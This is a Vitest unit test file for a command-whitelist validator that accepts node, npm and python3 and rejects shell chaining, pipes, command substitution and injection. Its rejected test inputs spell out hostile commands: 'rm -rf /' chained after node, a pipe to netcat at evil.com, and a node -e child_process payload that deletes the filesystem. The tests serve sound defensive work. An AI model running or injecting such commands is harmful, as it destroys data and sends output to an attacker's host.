/**
 * command-whitelist 单元测试
 * ----------------------------------------------------
 * 验证: 白名单过滤、链式操作符、命令替换
 */
import { describe, it, expect } from 'vitest';
import { validateCommand } from './command-whitelist.js';

describe('validateCommand', () => {
  it('accepts whitelisted node', () => {
    const r = validateCommand('node');
    expect(r.ok).toBe(true);
  });

  it('accepts whitelisted npm', () => {
    const r = validateCommand('npm --version');
    expect(r.ok).toBe(true);
  });

  it('accepts whitelisted python', () => {
    const r = validateCommand('python3 --version');
    expect(r.ok).toBe(true);
  });

  it('rejects non-whitelisted command', () => {
    const r = validateCommand('rm');
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.reason).toContain('not in whitelist');
    }
  });

  it('rejects shell chain with &&', () => {
    const r = validateCommand('node && rm -rf /');
    expect(r.ok).toBe(false);
  });

  it('rejects pipe', () => {
    const r = validateCommand('node | nc evil.com');
    expect(r.ok).toBe(false);
  });

  it('rejects semicolon', () => {
    const r = validateCommand('node; rm -rf /');
    expect(r.ok).toBe(false);
  });

  it('rejects command substitution $()', () => {
    const r = validateCommand('node $(whoami)');
    expect(r.ok).toBe(false);
  });

  it('rejects command substitution ${}', () => {
    const r = validateCommand('node ${HOME}');
    expect(r.ok).toBe(false);
  });

  it('rejects backtick substitution', () => {
    const r = validateCommand('node `whoami`');
    expect(r.ok).toBe(false);
  });

  it('rejects RCE payload', () => {
    const r = validateCommand('node -e "require(\'child_process\').exec(\'rm -rf /\')"');
    expect(r.ok).toBe(false);
  });
});
